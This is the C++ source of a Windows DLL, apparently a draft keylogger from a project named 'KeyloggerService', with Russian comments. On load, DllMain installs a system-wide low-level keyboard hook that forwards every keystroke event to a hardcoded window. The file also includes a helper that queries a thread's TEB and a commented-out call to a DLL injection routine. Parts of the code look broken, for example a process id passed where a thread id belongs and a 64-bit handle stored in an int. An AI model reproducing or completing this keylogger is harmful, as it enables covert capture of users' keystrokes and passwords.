#include <Windows.h>
//#include <winternl.h>
#include <TlHelp32.h>
#include <iostream>
#include <fstream>
#include "defines.h"
#include <vector>
#define TRAVERSE_FLAG_DEBUG   (1u << 1)
#pragma comment (lib, "ntdll.lib")

HHOOK g_hHook;
HMODULE hLib;
NTSTATUS status;

/* get_teb()
Get the address of the thread environment block of a thread in another process.
'tid' is the thread id of the thread
'flags' is the optional flags parameter that was passed to traverse_threads() or a callback
returns the TEB address on success
*/
void* get_teb(
    const DWORD tid,   // in
    const DWORD flags   // in, optional
)
{
    static NTSTATUS(__stdcall * NtQueryInformationThread)(
        HANDLE ThreadHandle,
        int ThreadInformationClass,
        PVOID ThreadInformation,
        ULONG ThreadInformationLength,
        PULONG ReturnLength
        );

    struct /* THREAD_BASIC_INFORMATION */
    {
        LONG ExitStatus;
        PVOID TebBaseAddress;
        struct
        {
            HANDLE UniqueProcess;
            HANDLE UniqueThread;
        } ClientId;
        ULONG_PTR AffinityMask;
        LONG Priority;
        LONG BasePriority;
    } tbi;

    LONG status = 0;
    HANDLE thread = NULL;
    void* return_code = NULL;


    if (!NtQueryInformationThread)
    {
        SetLastError(0); // error code is evaluated on success
        *(FARPROC*)&NtQueryInformationThread =
            (FARPROC)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationThread");

        if ((flags & TRAVERSE_FLAG_DEBUG))
        {
            printf("GetProcAddress() %s. GLE: %lu, NtQueryInformationThread: 0x%p.\n",
                (NtQueryInformationThread ? "success" : "error"),
                GetLastError(),
                NtQueryInformationThread
            );
        }

        if (!NtQueryInformationThread)
            goto cleanup;
    }

    SetLastError(0); // error code is evaluated on success
    thread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, tid);

    if ((flags & TRAVERSE_FLAG_DEBUG))
    {
        printf("OpenThread() %s. tid: %lu, GLE: %lu, Handle: 0x%p.\n",
            (thread ? "success" : "error"),
            tid,
            GetLastError(),
            thread
        );
    }

    if (!thread)
        goto cleanup;

    /* request ThreadBasicInformation */
    status = NtQueryInformationThread(thread, 0, &tbi, sizeof(tbi), NULL);

    if ((flags & TRAVERSE_FLAG_DEBUG))
    {
        printf("NtQueryInformationThread() %s. status: 0x%08X.\n",
            ((status) ? "!= STATUS_SUCCESS" : "== STATUS_SUCCESS"),
            (unsigned)status
        );
    }

    if (status) // || ( tbi.ExitStatus != STATUS_PENDING ) )
        goto cleanup;

    return_code = tbi.TebBaseAddress;

cleanup:

    if (thread)
    {
        BOOL ret = 0;

        SetLastError(0); // error code is evaluated on success
        ret = CloseHandle(thread);

        if ((flags & TRAVERSE_FLAG_DEBUG))
        {
            printf("CloseHandle() %s. GLE: %lu, Handle: 0x%p\n",
                (ret ? "success" : "error"),
                GetLastError(),
                thread
            );
        }

        thread = NULL;
    }

    return return_code;
}

DWORD dwCurrentProcessId;
HANDLE hCurrentProcess;
DWORD dwMainThreadId;

void sendMyData(HWND receiver, const Rpc& data) {
    // Создаем блок памяти и копируем туда данные
    // Важно: данные должны быть скопированы в блок памяти, выделенный с помощью функции GlobalAlloc
    // Если вы используете другой способ выделения памяти, передача данных может работать некорректно
    void* buffer = GlobalAlloc(GMEM_FIXED, sizeof(Rpc));
    if (buffer == 0)return;
    memcpy(buffer, &data, sizeof(Rpc));

    // Создаем структуру COPYDATASTRUCT
    COPYDATASTRUCT* pcds = new COPYDATASTRUCT;
    pcds->dwData = 0; // Некоторое пользовательское значение, которое может быть использовано приемником
    pcds->cbData = sizeof(Rpc); // Размер блока памяти с данными
    pcds->lpData = buffer; // Указатель на блок памяти

    // Отправляем сообщение с помощью функции SendMessage или PostMessage
    PostMessage(receiver, WM_MYMESSAGE, (WPARAM)(HWND)NULL, (LPARAM)&pcds);

    //delete pcds;
}



LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{

    if (nCode == HC_ACTION) {

        Rpc kw(Rpc::HookProc, nCode, wParam, lParam);
        int hwnd_int = 0x0000000001aa003a;
        HWND hWnd = reinterpret_cast<HWND>(hwnd_int);//FindWindow(NULL, KEYLOGGERWINDOW);
        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\output.txt", std::ios_base::app);
        if (outFile.is_open()) {
            outFile << hWnd;
        }
        outFile.close();
        //if (WorkerWindow) {
            //sendMyData(hWnd,kw);
            //PostMessage(hWnd, WM_MYMESSAGE, wParam, reinterpret_cast<LPARAM>(&kw));
            //sendViaSharedMemory(kw);
        PostMessage(hWnd, WM_MYMESSAGE, wParam, NULL);
        //}
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}



BOOL InstallHook(DWORD dwThreadId)
{
    std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\output2.txt", std::ios_base::app);
    if (outFile.is_open()) {
        outFile << "One" << std::endl;
    }

    //HWND hWnd = FindWindow(NULL, _T("Window Title"));
    //DWORD dwRemoteThreadId = GetWindowThreadProcessId(WorkerWindow, NULL);
    DWORD dwThisThreadId = GetWindowThreadProcessId(GetForegroundWindow(), NULL);

    AttachThreadInput(dwThreadId, dwThisThreadId, TRUE);

    // Теперь можно отправлять сообщения в найденное окно

    //AttachThreadInput(dwThreadId, dwThisThreadId, FALSE);

    if (outFile.is_open())outFile.close();

    hLib = LoadLibrary(TEXT("HookDll"));
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, hLib, 0);
    if (g_hHook != NULL)
    {
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        return TRUE;
    }
    return FALSE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // получить идентификатор текущего процесса
        dwCurrentProcessId = GetCurrentProcessId();
        // получить дескриптор текущего процесса
        hCurrentProcess = GetCurrentProcess();
        // выполнить InjectDLL в текущий процесс
        //InjectDLL(lpDLLPath, dwCurrentProcessId, hCurrentProcess);
        dwMainThreadId = (DWORD)get_teb(dwCurrentProcessId, NULL);
        // установить хук в главном потоке текущего процесса
        InstallHook(dwMainThreadId);
        break;
    case DLL_PROCESS_DETACH:
        // удалить хук
        UnhookWindowsHookEx(g_hHook);
        break;
    }
    return TRUE;
}